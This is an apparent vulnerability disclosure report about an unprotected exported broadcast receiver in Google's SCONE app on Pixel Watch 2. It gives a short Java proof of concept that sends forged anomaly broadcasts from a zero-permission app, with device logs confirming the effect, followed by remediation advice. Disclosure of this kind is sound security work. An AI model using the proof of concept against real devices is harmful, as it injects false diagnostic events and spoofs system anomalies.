# VRP Report #47: Scone CMBroadCastReceiver — Zero-Permission Forged Anomaly Broadcasts

## Summary

The `CMBroadCastReceiver` in Google's SCONE app (com.google.android.apps.scone) on Pixel Watch 2 is exported without any permission requirement. A zero-permission malicious app can send the `ACTION_ANOMALY_REPORTED` broadcast with attacker-controlled data, which is accepted and processed by SCONE's connectivity monitoring system. This enables injection of false diagnostic events and triggers diagnostic collection routines with forged data.

## Vulnerability Details

**Component:** `com.google.android.apps.scone/.connectivitymonitor.CMBroadCastReceiver`
**Package:** com.google.android.apps.scone (SCONE-WEAR-v60982, versionCode 56121)
**Device:** Pixel Watch 2 (eos, CP2A.260603.001, June 2026 security patches)

### Manifest Declaration

```xml
<receiver android:exported="true"
    android:name="com.google.android.apps.scone.connectivitymonitor.CMBroadCastReceiver">
    <intent-filter>
        <action android:name="com.google.android.apps.scone.ACTION_ANOMALY_REPORTED" />
        <!-- ... other actions ... -->
    </intent-filter>
</receiver>
```

**Missing:** No `android:permission` attribute on the receiver. Any app can send broadcasts to this component.

### Root Cause

1. The action `com.google.android.apps.scone.ACTION_ANOMALY_REPORTED` is **NOT** a protected broadcast (unlike `android.telephony.action.ANOMALY_REPORTED` which IS protected)
2. The receiver has no permission requirement in the manifest
3. On user builds, `CMBroadCastReceiver.onReceive()` filters to an allowlist of 7 actions — `ACTION_ANOMALY_REPORTED` is on this allowlist
4. The attacker-controlled extras (`EXTRA_ISSUE_TYPE_STRING`, `EXTRA_ISSUE_DESCRIPTION`) are passed directly to `ConnectivityEventWriter` and `BugReportGenerator`

### Code Flow

```
CMBroadCastReceiver.onReceive()
  → checks action against allowlist (user build) → PASSES for ACTION_ANOMALY_REPORTED
  → extracts issue_type and description from extras
  → ConnectivityEventWriter.addTag() — writes diagnostic event with attacker data
  → BugReportGenerator — attempts bugreport (blocked on user builds, enabled on userdebug)
```

## Proof of Concept

### PoC App Code (DataLeakTestActivity.java)

```java
Intent intent = new Intent("com.google.android.apps.scone.ACTION_ANOMALY_REPORTED");
intent.setClassName("com.google.android.apps.scone",
    "com.google.android.apps.scone.connectivitymonitor.CMBroadCastReceiver");
intent.putExtra("com.google.android.apps.scone.EXTRA_ISSUE_TYPE_STRING",
    "LINE1_NUMBER_ERROR");
intent.putExtra("com.google.android.apps.scone.EXTRA_ISSUE_DESCRIPTION",
    "FORGED_FROM_ZERO_PERM_APP_UID_" + android.os.Process.myUid());
sendBroadcast(intent);
// No SecurityException — broadcast delivered and processed
```

### Dynamic Proof (Pixel Watch 2)

**PoC app:** com.vrp.poc (UID 10156, zero dangerous permissions granted)

```
# PoC app sends forged broadcast (PID 32322, UID 10156):
09-10 09:43:53.019 32322 32349 I VRP_DATALEAK: SCONE_BROADCAST_SENT_FROM_APP
09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Broadcast SENT (no SecurityException)
09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Action: com.google.android.apps.scone.ACTION_ANOMALY_REPORTED
09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Issue type: LINE1_NUMBER_ERROR
09-10 09:43:53.019 32322 32349 I VRP_DATALEAK:   Description: FORGED_FROM_ZERO_PERM_APP_UID_10156

# SCONE receives and processes the forged broadcast (PID 30468):
09-10 09:44:01.231 30468 32612 I CMBroadCastReceiver: SCONE anomaly received, issue type:LINE1_NUMBER_ERROR desc:FORGED_FROM_ZERO_PERM_APP_UID_10156
09-10 09:44:01.287 30468 32612 W ConnectivityEventWriter: Failed to add tag: ConnectivityMonitorEventMetadata{...}
09-10 09:44:01.297 30468 32612 D BugReportGenerator: Bugreport not available for non userdebug mode: LINE1_NUMBER_ERROR
```

**Key evidence:** The PoC app (UID 10156) with zero permissions sent a forged anomaly broadcast. SCONE (PID 30468) received the broadcast, logged it as a genuine anomaly, attempted to write a diagnostic event via `ConnectivityEventWriter`, and checked whether to generate a bugreport.

### Permission Verification

```
# All dangerous permissions revoked before test:
android.permission.INTERNET: granted=true     (install-time, irrelevant)
android.permission.QUERY_ALL_PACKAGES: granted=true  (normal, irrelevant)
# No READ_PHONE_STATE, no SEND_SMS, no special telephony permissions
```

## Impact

### Integrity Violation
- Attacker injects false diagnostic events into SCONE's connectivity monitoring
- Forged anomaly reports appear as legitimate system events
- Issue type and description fields are fully attacker-controlled
- `ConnectivityEventWriter` records these as genuine connectivity events

### Availability Impact
- Repeated forged broadcasts trigger diagnostic processing cycles
- Each broadcast invocation creates `ConnectivityMonitorEventMetadata` entries
- On **userdebug builds**, this triggers actual bugreport generation (confirmed by `BugReportGenerator` code path)

### Supported Anomaly Types
The attacker can forge any of the 7 allowlisted issue types on user builds:
1. `SMS_MMS_DB_LOST` — fake SMS/MMS database loss
2. `SMS_MMS_DB_CREATED` — fake database creation
3. `ACTION_LINE1_NUMBER_ERROR_DETECTED` — fake line number errors
4. `ANOMALY_REPORTED` (telephony) — fake telephony anomalies
5. `QCRIL_ISSUE` — fake Qualcomm RIL issues
6. `RIL_ISSUE` — fake RIL issues
7. `ACTION_ANOMALY_REPORTED` (scone) — fake scone anomalies

## Remediation

1. Add `android:permission="android.permission.READ_PRIVILEGED_PHONE_STATE"` to the receiver declaration
2. Verify the sender's UID/package in `onReceive()` before processing
3. Use `registerReceiver()` with a signature-level permission instead of manifest-registered exported receiver

## Affected Versions

- SCONE-WEAR-v60982 (versionCode 56121) on Pixel Watch 2
- Build: CP2A.260603.001 (June 2026 security patches)
- Likely affects all Wear OS devices running SCONE with this receiver configuration
